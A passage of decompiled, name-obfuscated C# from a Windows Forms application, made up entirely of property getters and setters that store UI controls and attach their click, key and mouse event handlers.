	internal ToolStripStatusLabel vmethod_404()
	{
		return this.toolStripStatusLabel_11;
	}

	// Token: 0x060006B2 RID: 1714 RVA: 0x00005CC9 File Offset: 0x00003EC9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_405(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_11 = toolStripStatusLabel_40;
	}

	// Token: 0x060006B3 RID: 1715 RVA: 0x00005CD2 File Offset: 0x00003ED2
	internal ToolStripStatusLabel vmethod_406()
	{
		return this.toolStripStatusLabel_12;
	}

	// Token: 0x060006B4 RID: 1716 RVA: 0x00005CDA File Offset: 0x00003EDA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_407(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_12 = toolStripStatusLabel_40;
	}

	// Token: 0x060006B5 RID: 1717 RVA: 0x00005CE3 File Offset: 0x00003EE3
	internal ToolStripProgressBar vmethod_408()
	{
		return this.toolStripProgressBar_1;
	}

	// Token: 0x060006B6 RID: 1718 RVA: 0x00005CEB File Offset: 0x00003EEB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_409(ToolStripProgressBar toolStripProgressBar_8)
	{
		this.toolStripProgressBar_1 = toolStripProgressBar_8;
	}

	// Token: 0x060006B7 RID: 1719 RVA: 0x00005CF4 File Offset: 0x00003EF4
	internal ToolStripMenuItem vmethod_410()
	{
		return this.toolStripMenuItem_88;
	}

	// Token: 0x060006B8 RID: 1720 RVA: 0x00005CFC File Offset: 0x00003EFC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_411(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_88 = toolStripMenuItem_136;
	}

	// Token: 0x060006B9 RID: 1721 RVA: 0x00005D05 File Offset: 0x00003F05
	internal ToolStripMenuItem vmethod_412()
	{
		return this.toolStripMenuItem_89;
	}

	// Token: 0x060006BA RID: 1722 RVA: 0x00005D0D File Offset: 0x00003F0D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_413(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_89 = toolStripMenuItem_136;
	}

	// Token: 0x060006BB RID: 1723 RVA: 0x00005D16 File Offset: 0x00003F16
	internal ToolStripMenuItem vmethod_414()
	{
		return this.toolStripMenuItem_90;
	}

	// Token: 0x060006BC RID: 1724 RVA: 0x00037914 File Offset: 0x00035B14
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_415(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_136);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_90;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_90 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_90;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006BD RID: 1725 RVA: 0x00005D1E File Offset: 0x00003F1E
	internal TabPage vmethod_416()
	{
		return this.tabPage_10;
	}

	// Token: 0x060006BE RID: 1726 RVA: 0x00005D26 File Offset: 0x00003F26
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_417(TabPage tabPage_17)
	{
		this.tabPage_10 = tabPage_17;
	}

	// Token: 0x060006BF RID: 1727 RVA: 0x00005D2F File Offset: 0x00003F2F
	internal GClass7 vmethod_418()
	{
		return this.gclass7_4;
	}

	// Token: 0x060006C0 RID: 1728 RVA: 0x00037958 File Offset: 0x00035B58
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_419(GClass7 gclass7_13)
	{
		KeyEventHandler value = new KeyEventHandler(this.method_155);
		GClass7 gclass = this.gclass7_4;
		if (gclass != null)
		{
			gclass.KeyDown -= value;
		}
		this.gclass7_4 = gclass7_13;
		gclass = this.gclass7_4;
		if (gclass != null)
		{
			gclass.KeyDown += value;
		}
	}

	// Token: 0x060006C1 RID: 1729 RVA: 0x00005D37 File Offset: 0x00003F37
	internal ContextMenuStrip vmethod_420()
	{
		return this.contextMenuStrip_8;
	}

	// Token: 0x060006C2 RID: 1730 RVA: 0x00005D3F File Offset: 0x00003F3F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_421(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_8 = contextMenuStrip_14;
	}

	// Token: 0x060006C3 RID: 1731 RVA: 0x00005D48 File Offset: 0x00003F48
	internal ToolStripMenuItem vmethod_422()
	{
		return this.toolStripMenuItem_91;
	}

	// Token: 0x060006C4 RID: 1732 RVA: 0x0003799C File Offset: 0x00035B9C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_423(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_137);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_91;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_91 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_91;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006C5 RID: 1733 RVA: 0x00005D50 File Offset: 0x00003F50
	internal ToolStripSeparator vmethod_424()
	{
		return this.toolStripSeparator_18;
	}

	// Token: 0x060006C6 RID: 1734 RVA: 0x00005D58 File Offset: 0x00003F58
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_425(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_18 = toolStripSeparator_39;
	}

	// Token: 0x060006C7 RID: 1735 RVA: 0x00005D61 File Offset: 0x00003F61
	internal ToolStripMenuItem vmethod_426()
	{
		return this.toolStripMenuItem_92;
	}

	// Token: 0x060006C8 RID: 1736 RVA: 0x00005D69 File Offset: 0x00003F69
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_427(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_92 = toolStripMenuItem_136;
	}

	// Token: 0x060006C9 RID: 1737 RVA: 0x00005D72 File Offset: 0x00003F72
	internal ToolStripMenuItem vmethod_428()
	{
		return this.toolStripMenuItem_93;
	}

	// Token: 0x060006CA RID: 1738 RVA: 0x000379E0 File Offset: 0x00035BE0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_429(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_140);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_93;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_93 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_93;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006CB RID: 1739 RVA: 0x00005D7A File Offset: 0x00003F7A
	internal ToolStripSeparator vmethod_430()
	{
		return this.toolStripSeparator_19;
	}

	// Token: 0x060006CC RID: 1740 RVA: 0x00005D82 File Offset: 0x00003F82
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_431(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_19 = toolStripSeparator_39;
	}

	// Token: 0x060006CD RID: 1741 RVA: 0x00005D8B File Offset: 0x00003F8B
	internal ToolStripMenuItem vmethod_432()
	{
		return this.toolStripMenuItem_94;
	}

	// Token: 0x060006CE RID: 1742 RVA: 0x00037A24 File Offset: 0x00035C24
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_433(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_139);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_94;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_94 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_94;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006CF RID: 1743 RVA: 0x00005D93 File Offset: 0x00003F93
	internal ToolStripMenuItem vmethod_434()
	{
		return this.toolStripMenuItem_95;
	}

	// Token: 0x060006D0 RID: 1744 RVA: 0x00037A68 File Offset: 0x00035C68
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_435(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_141);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_95;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_95 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_95;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006D1 RID: 1745 RVA: 0x00005D9B File Offset: 0x00003F9B
	internal ToolStripSeparator vmethod_436()
	{
		return this.toolStripSeparator_20;
	}

	// Token: 0x060006D2 RID: 1746 RVA: 0x00005DA3 File Offset: 0x00003FA3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_437(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_20 = toolStripSeparator_39;
	}

	// Token: 0x060006D3 RID: 1747 RVA: 0x00005DAC File Offset: 0x00003FAC
	internal ToolStripMenuItem vmethod_438()
	{
		return this.toolStripMenuItem_96;
	}

	// Token: 0x060006D4 RID: 1748 RVA: 0x00037AAC File Offset: 0x00035CAC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_439(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_142);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_96;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_96 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_96;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006D5 RID: 1749 RVA: 0x00005DB4 File Offset: 0x00003FB4
	internal ToolStripSeparator vmethod_440()
	{
		return this.toolStripSeparator_21;
	}

	// Token: 0x060006D6 RID: 1750 RVA: 0x00005DBC File Offset: 0x00003FBC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_441(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_21 = toolStripSeparator_39;
	}

	// Token: 0x060006D7 RID: 1751 RVA: 0x00005DC5 File Offset: 0x00003FC5
	internal ToolStripSeparator vmethod_442()
	{
		return this.toolStripSeparator_22;
	}

	// Token: 0x060006D8 RID: 1752 RVA: 0x00005DCD File Offset: 0x00003FCD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_443(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_22 = toolStripSeparator_39;
	}

	// Token: 0x060006D9 RID: 1753 RVA: 0x00005DD6 File Offset: 0x00003FD6
	internal ToolStripStatusLabel vmethod_444()
	{
		return this.toolStripStatusLabel_13;
	}

	// Token: 0x060006DA RID: 1754 RVA: 0x00005DDE File Offset: 0x00003FDE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_445(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_13 = toolStripStatusLabel_40;
	}

	// Token: 0x060006DB RID: 1755 RVA: 0x00005DE7 File Offset: 0x00003FE7
	internal Button vmethod_446()
	{
		return this.button_0;
	}

	// Token: 0x060006DC RID: 1756 RVA: 0x00037AF0 File Offset: 0x00035CF0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_447(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_149);
		Button button = this.button_0;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_0 = button_9;
		button = this.button_0;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x060006DD RID: 1757 RVA: 0x00005DEF File Offset: 0x00003FEF
	internal Button vmethod_448()
	{
		return this.button_1;
	}

	// Token: 0x060006DE RID: 1758 RVA: 0x00037B34 File Offset: 0x00035D34
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_449(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_144);
		Button button = this.button_1;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_1 = button_9;
		button = this.button_1;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x060006DF RID: 1759 RVA: 0x00005DF7 File Offset: 0x00003FF7
	internal Button vmethod_450()
	{
		return this.button_2;
	}

	// Token: 0x060006E0 RID: 1760 RVA: 0x00037B78 File Offset: 0x00035D78
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_451(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_145);
		Button button = this.button_2;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_2 = button_9;
		button = this.button_2;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x060006E1 RID: 1761 RVA: 0x00005DFF File Offset: 0x00003FFF
	internal Button vmethod_452()
	{
		return this.button_3;
	}

	// Token: 0x060006E2 RID: 1762 RVA: 0x00037BBC File Offset: 0x00035DBC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_453(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_146);
		Button button = this.button_3;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_3 = button_9;
		button = this.button_3;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x060006E3 RID: 1763 RVA: 0x00005E07 File Offset: 0x00004007
	internal ComboBox vmethod_454()
	{
		return this.comboBox_7;
	}

	// Token: 0x060006E4 RID: 1764 RVA: 0x00037C00 File Offset: 0x00035E00
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_455(ComboBox comboBox_9)
	{
		EventHandler value = new EventHandler(this.method_150);
		DrawItemEventHandler value2 = new DrawItemEventHandler(this.method_157);
		MeasureItemEventHandler value3 = new MeasureItemEventHandler(this.method_158);
		ComboBox comboBox = this.comboBox_7;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged -= value;
			comboBox.DrawItem -= value2;
			comboBox.MeasureItem -= value3;
		}
		this.comboBox_7 = comboBox_9;
		comboBox = this.comboBox_7;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged += value;
			comboBox.DrawItem += value2;
			comboBox.MeasureItem += value3;
		}
	}

	// Token: 0x060006E5 RID: 1765 RVA: 0x00005E0F File Offset: 0x0000400F
	internal ToolStripMenuItem vmethod_456()
	{
		return this.toolStripMenuItem_97;
	}

	// Token: 0x060006E6 RID: 1766 RVA: 0x00037C7C File Offset: 0x00035E7C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_457(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_153);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_97;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_97 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_97;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006E7 RID: 1767 RVA: 0x00005E17 File Offset: 0x00004017
	internal ToolStripMenuItem vmethod_458()
	{
		return this.toolStripMenuItem_98;
	}

	// Token: 0x060006E8 RID: 1768 RVA: 0x00037CC0 File Offset: 0x00035EC0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_459(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_154);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_98;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_98 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_98;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060006E9 RID: 1769 RVA: 0x00005E1F File Offset: 0x0000401F
	internal TabPage vmethod_460()
	{
		return this.tabPage_11;
	}

	// Token: 0x060006EA RID: 1770 RVA: 0x00005E27 File Offset: 0x00004027
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_461(TabPage tabPage_17)
	{
		this.tabPage_11 = tabPage_17;
	}

	// Token: 0x060006EB RID: 1771 RVA: 0x00005E30 File Offset: 0x00004030
	internal Label vmethod_462()
	{
		return this.label_22;
	}

	// Token: 0x060006EC RID: 1772 RVA: 0x00005E38 File Offset: 0x00004038
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_463(Label label_30)
	{
		this.label_22 = label_30;
	}

	// Token: 0x060006ED RID: 1773 RVA: 0x00005E41 File Offset: 0x00004041
	internal PictureBox vmethod_464()
	{
		return this.pictureBox_3;
	}

	// Token: 0x060006EE RID: 1774 RVA: 0x00037D04 File Offset: 0x00035F04
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_465(PictureBox pictureBox_7)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_159);
		MouseEventHandler value2 = new MouseEventHandler(this.method_160);
		MouseEventHandler value3 = new MouseEventHandler(this.method_164);
		MouseEventHandler value4 = new MouseEventHandler(this.method_165);
		PictureBox pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.MouseDown -= value;
			pictureBox.MouseMove -= value2;
			pictureBox.MouseUp -= value3;
			pictureBox.MouseWheel -= value4;
		}
		this.pictureBox_3 = pictureBox_7;
		pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.MouseDown += value;
			pictureBox.MouseMove += value2;
			pictureBox.MouseUp += value3;
			pictureBox.MouseWheel += value4;
		}
	}

	// Token: 0x060006EF RID: 1775 RVA: 0x00005E49 File Offset: 0x00004049
	internal RichTextBox vmethod_466()
	{
		return this.richTextBox_3;
	}

	// Token: 0x060006F0 RID: 1776 RVA: 0x00005E51 File Offset: 0x00004051
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_467(RichTextBox richTextBox_5)
	{
		this.richTextBox_3 = richTextBox_5;
	}

	// Token: 0x060006F1 RID: 1777 RVA: 0x00005E5A File Offset: 0x0000405A
	internal StatusStrip vmethod_468()
	{
		return this.statusStrip_3;
	}

	// Token: 0x060006F2 RID: 1778 RVA: 0x00005E62 File Offset: 0x00004062
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_469(StatusStrip statusStrip_11)
	{
		this.statusStrip_3 = statusStrip_11;
	}

	// Token: 0x060006F3 RID: 1779 RVA: 0x00005E6B File Offset: 0x0000406B
	internal ToolStripStatusLabel vmethod_470()
	{
		return this.toolStripStatusLabel_14;
	}

	// Token: 0x060006F4 RID: 1780 RVA: 0x00005E73 File Offset: 0x00004073
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_471(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_14 = toolStripStatusLabel_40;
	}

	// Token: 0x060006F5 RID: 1781 RVA: 0x00005E7C File Offset: 0x0000407C
	internal ZeroitAnidasoCircleProgress vmethod_472()
	{
		return this.zeroitAnidasoCircleProgress_3;
	}

	// Token: 0x060006F6 RID: 1782 RVA: 0x00005E84 File Offset: 0x00004084
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_473(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
	{
		this.zeroitAnidasoCircleProgress_3 = zeroitAnidasoCircleProgress_8;
	}

	// Token: 0x060006F7 RID: 1783 RVA: 0x00005E8D File Offset: 0x0000408D
	internal ZeroitProgressIndicator vmethod_474()
	{
		return this.zeroitProgressIndicator_0;
	}

	// Token: 0x060006F8 RID: 1784 RVA: 0x00005E95 File Offset: 0x00004095
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_475(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_0 = zeroitProgressIndicator_9;
	}

	// Token: 0x060006F9 RID: 1785 RVA: 0x00005E9E File Offset: 0x0000409E
	internal StatusStrip vmethod_476()
	{
		return this.statusStrip_4;
	}

	// Token: 0x060006FA RID: 1786 RVA: 0x00005EA6 File Offset: 0x000040A6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_477(StatusStrip statusStrip_11)
	{
		this.statusStrip_4 = statusStrip_11;
	}

	// Token: 0x060006FB RID: 1787 RVA: 0x00005EAF File Offset: 0x000040AF
	internal ToolStripStatusLabel vmethod_478()
	{
		return this.toolStripStatusLabel_15;
	}

	// Token: 0x060006FC RID: 1788 RVA: 0x00005EB7 File Offset: 0x000040B7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_479(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_15 = toolStripStatusLabel_40;
	}

	// Token: 0x060006FD RID: 1789 RVA: 0x00005EC0 File Offset: 0x000040C0
	internal ToolStripStatusLabel vmethod_480()
	{
		return this.toolStripStatusLabel_16;
	}

	// Token: 0x060006FE RID: 1790 RVA: 0x00005EC8 File Offset: 0x000040C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_481(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_16 = toolStripStatusLabel_40;
	}

	// Token: 0x060006FF RID: 1791 RVA: 0x00005ED1 File Offset: 0x000040D1
	internal StatusStrip vmethod_482()
	{
		return this.statusStrip_5;
	}

	// Token: 0x06000700 RID: 1792 RVA: 0x00005ED9 File Offset: 0x000040D9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_483(StatusStrip statusStrip_11)
	{
		this.statusStrip_5 = statusStrip_11;
	}

	// Token: 0x06000701 RID: 1793 RVA: 0x00005EE2 File Offset: 0x000040E2
	internal ToolStripStatusLabel vmethod_484()
	{
		return this.toolStripStatusLabel_17;
	}

	// Token: 0x06000702 RID: 1794 RVA: 0x00005EEA File Offset: 0x000040EA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_485(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_17 = toolStripStatusLabel_40;
	}

	// Token: 0x06000703 RID: 1795 RVA: 0x00005EF3 File Offset: 0x000040F3
	internal ToolStripStatusLabel vmethod_486()
	{
		return this.toolStripStatusLabel_18;
	}

	// Token: 0x06000704 RID: 1796 RVA: 0x00005EFB File Offset: 0x000040FB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_487(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_18 = toolStripStatusLabel_40;
	}

	// Token: 0x06000705 RID: 1797 RVA: 0x00005F04 File Offset: 0x00004104
	internal ToolStripStatusLabel vmethod_488()
	{
		return this.toolStripStatusLabel_19;
	}

	// Token: 0x06000706 RID: 1798 RVA: 0x00005F0C File Offset: 0x0000410C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_489(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_19 = toolStripStatusLabel_40;
	}

	// Token: 0x06000707 RID: 1799 RVA: 0x00005F15 File Offset: 0x00004115
	internal ToolStripStatusLabel vmethod_490()
	{
		return this.toolStripStatusLabel_20;
	}

	// Token: 0x06000708 RID: 1800 RVA: 0x00005F1D File Offset: 0x0000411D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_491(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_20 = toolStripStatusLabel_40;
	}

	// Token: 0x06000709 RID: 1801 RVA: 0x00005F26 File Offset: 0x00004126
	internal ToolStripProgressBar vmethod_492()
	{
		return this.toolStripProgressBar_2;
	}

	// Token: 0x0600070A RID: 1802 RVA: 0x00005F2E File Offset: 0x0000412E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_493(ToolStripProgressBar toolStripProgressBar_8)
	{
		this.toolStripProgressBar_2 = toolStripProgressBar_8;
	}

	// Token: 0x0600070B RID: 1803 RVA: 0x00005F37 File Offset: 0x00004137
	internal StatusStrip vmethod_494()
	{
		return this.statusStrip_6;
	}

	// Token: 0x0600070C RID: 1804 RVA: 0x00005F3F File Offset: 0x0000413F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_495(StatusStrip statusStrip_11)
	{
		this.statusStrip_6 = statusStrip_11;
	}

	// Token: 0x0600070D RID: 1805 RVA: 0x00005F48 File Offset: 0x00004148
	internal ToolStripStatusLabel vmethod_496()
	{
		return this.toolStripStatusLabel_21;
	}

	// Token: 0x0600070E RID: 1806 RVA: 0x00005F50 File Offset: 0x00004150
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_497(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_21 = toolStripStatusLabel_40;
	}

	// Token: 0x0600070F RID: 1807 RVA: 0x00005F59 File Offset: 0x00004159
	internal ToolStripStatusLabel vmethod_498()
	{
		return this.toolStripStatusLabel_22;
	}

	// Token: 0x06000710 RID: 1808 RVA: 0x00005F61 File Offset: 0x00004161
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_499(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_22 = toolStripStatusLabel_40;
	}

	// Token: 0x06000711 RID: 1809 RVA: 0x00005F6A File Offset: 0x0000416A
	internal ToolStripStatusLabel vmethod_500()
	{
		return this.toolStripStatusLabel_23;
	}

	// Token: 0x06000712 RID: 1810 RVA: 0x00005F72 File Offset: 0x00004172
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_501(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_23 = toolStripStatusLabel_40;
	}

	// Token: 0x06000713 RID: 1811 RVA: 0x00005F7B File Offset: 0x0000417B
	internal ToolStripStatusLabel vmethod_502()
	{
		return this.toolStripStatusLabel_24;
	}

	// Token: 0x06000714 RID: 1812 RVA: 0x00005F83 File Offset: 0x00004183
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_503(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_24 = toolStripStatusLabel_40;
	}

	// Token: 0x06000715 RID: 1813 RVA: 0x00005F8C File Offset: 0x0000418C
	internal ToolStripStatusLabel vmethod_504()
	{
		return this.toolStripStatusLabel_25;
	}

	// Token: 0x06000716 RID: 1814 RVA: 0x00005F94 File Offset: 0x00004194
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_505(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_25 = toolStripStatusLabel_40;
	}

	// Token: 0x06000717 RID: 1815 RVA: 0x00005F9D File Offset: 0x0000419D
	internal ToolStripProgressBar vmethod_506()
	{
		return this.toolStripProgressBar_3;
	}

	// Token: 0x06000718 RID: 1816 RVA: 0x00005FA5 File Offset: 0x000041A5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_507(ToolStripProgressBar toolStripProgressBar_8)
	{
		this.toolStripProgressBar_3 = toolStripProgressBar_8;
	}

	// Token: 0x06000719 RID: 1817 RVA: 0x00005FAE File Offset: 0x000041AE
	internal ZeroitProgressIndicator vmethod_508()
	{
		return this.zeroitProgressIndicator_1;
	}

	// Token: 0x0600071A RID: 1818 RVA: 0x00005FB6 File Offset: 0x000041B6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_509(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_1 = zeroitProgressIndicator_9;
	}

	// Token: 0x0600071B RID: 1819 RVA: 0x00005FBF File Offset: 0x000041BF
	internal RichTextBox vmethod_510()
	{
		return this.richTextBox_4;
	}

	// Token: 0x0600071C RID: 1820 RVA: 0x00037D9C File Offset: 0x00035F9C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_511(RichTextBox richTextBox_5)
	{
		KeyEventHandler value = new KeyEventHandler(this.method_253);
		RichTextBox richTextBox = this.richTextBox_4;
		if (richTextBox != null)
		{
			richTextBox.KeyDown -= value;
		}
		this.richTextBox_4 = richTextBox_5;
		richTextBox = this.richTextBox_4;
		if (richTextBox != null)
		{
			richTextBox.KeyDown += value;
		}
	}

	// Token: 0x0600071D RID: 1821 RVA: 0x00005FC7 File Offset: 0x000041C7
	internal ZeroitProgressIndicator vmethod_512()
	{
		return this.zeroitProgressIndicator_2;
	}

	// Token: 0x0600071E RID: 1822 RVA: 0x00005FCF File Offset: 0x000041CF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_513(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_2 = zeroitProgressIndicator_9;
	}

	// Token: 0x0600071F RID: 1823 RVA: 0x00005FD8 File Offset: 0x000041D8
	internal Label vmethod_514()
	{
		return this.label_23;
	}

	// Token: 0x06000720 RID: 1824 RVA: 0x00005FE0 File Offset: 0x000041E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_515(Label label_30)
	{
		this.label_23 = label_30;
	}

	// Token: 0x06000721 RID: 1825 RVA: 0x00005FE9 File Offset: 0x000041E9
	internal Label vmethod_516()
	{
		return this.label_24;
	}

	// Token: 0x06000722 RID: 1826 RVA: 0x00005FF1 File Offset: 0x000041F1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_517(Label label_30)
	{
